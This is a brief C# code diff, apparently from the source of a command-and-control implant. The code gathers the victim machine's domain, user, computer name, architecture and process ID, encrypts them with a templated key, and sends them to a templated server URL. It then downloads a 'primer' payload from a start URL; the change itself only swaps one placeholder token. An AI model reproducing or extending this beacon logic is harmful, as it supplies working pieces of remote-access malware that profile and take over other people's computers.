@@ -211,7 +211,7 @@ public class Program
 			var arch = System.Environment.GetEnvironmentVariable("PROCESSOR_ARCHITECTURE");
 			int pid = Process.GetCurrentProcess().Id;
 			Environment.CurrentDirectory = Environment.GetEnvironmentVariable("windir");
-			var o = String.Format("{0};{1};{2};{3};{4};#REPLACEBASEURL#", dn, u, cn, arch, pid);
+			var o = String.Format("{0};{1};{2};{3};{4};#REPLACEURLID#", dn, u, cn, arch, pid);
 			String key = "#REPLACEKEY#", baseURL = "#REPLACEBASEURL#", s = "#REPLACESTARTURL#";
 
 			var primer = GetWebRequest(Encryption(key, o)).DownloadString(s);
